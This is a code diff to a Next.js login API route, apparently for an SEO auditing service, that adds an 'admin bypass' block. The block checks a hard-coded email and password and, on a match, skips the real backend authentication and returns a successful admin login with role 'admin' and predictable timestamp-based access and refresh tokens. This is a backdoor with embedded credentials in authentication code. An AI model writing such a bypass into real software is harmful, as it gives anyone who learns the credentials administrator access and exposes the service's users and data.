@@ -27,6 +27,37 @@ export async function POST(request: NextRequest) {
       passwordLength: body.password?.length
     });
 
+    // Admin bypass for developer/operator access
+    const ADMIN_EMAIL = 'admin@seoauditer.com';
+    const ADMIN_PASSWORD = 'dev-bypass-2024!';
+    
+    if (body.email === ADMIN_EMAIL && body.password === ADMIN_PASSWORD) {
+      console.log('[Secure Auth API] Admin bypass activated');
+      
+      // Return a successful admin login response
+      const adminResponse = {
+        success: true,
+        data: {
+          user: {
+            id: 'admin-user-id',
+            email: ADMIN_EMAIL,
+            role: 'admin',
+            isVerified: true,
+            name: 'Admin User'
+          },
+          token: 'admin-access-token-' + Date.now(),
+          accessToken: 'admin-access-token-' + Date.now(),
+          refreshToken: 'admin-refresh-token-' + Date.now()
+        },
+        metadata: {
+          correlationId: 'admin-bypass-' + Date.now(),
+          timestamp: new Date().toISOString()
+        }
+      };
+      
+      return NextResponse.json(adminResponse, { status: 200 });
+    }
+
     const backendUrl = `${BACKEND_URL}/secure-auth/login`;
     console.log('[Secure Auth API] Attempting to connect to:', backendUrl);
     
